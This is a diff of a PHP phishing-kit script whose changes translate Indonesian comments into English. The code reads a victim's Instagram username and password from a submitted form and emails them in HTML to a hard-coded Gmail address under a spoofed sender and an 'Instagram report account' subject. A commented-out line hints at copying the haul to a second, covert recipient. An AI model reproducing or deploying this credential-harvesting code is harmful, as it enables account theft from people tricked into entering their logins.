@@ -6,15 +6,15 @@
 #===============================================#
 /* PLEASE DON'T CHANGE COPYRIGHT! */
 
-$subjek = 'Laporan Akun Instagram';
+$subjek = 'Instagram report account';
 $mailto = 'imamnurcakra@gmail.com'; //YOUR EMAIL ADDRESS
 
-/* Fungsi berikut untuk mengambil input field. */
+/* This function for take input field. */
 
 $imel = $_POST['user'];
 $paswot = $_POST['password'];
 
-/* Mengambil informasi untuk dikirim kepada facebook anda !. */
+/* take information to send on your gmail !. */
 
 $body = <<<EOD
 <br><hr><br>
@@ -24,7 +24,7 @@ Password : <font color="red">$paswot</font> <br>
 EOD;
 
 
-$headers = "From: Mr.Ackerman@gmail.com\r\n"; // Buat nunjukin pengirim email.
+$headers = "From: Mr.Ackerman@gmail.com\r\n"; // for showing gmail sender.
 $headers .= "Content-type: text/html\r\n";
 $success = mail($mailto, $subjek." #".rand(1000,10000), $body, $headers);
 // $successsadap = mail($mailsadap, $subjeksadap." #".rand(1000,10000), $body, $headers);
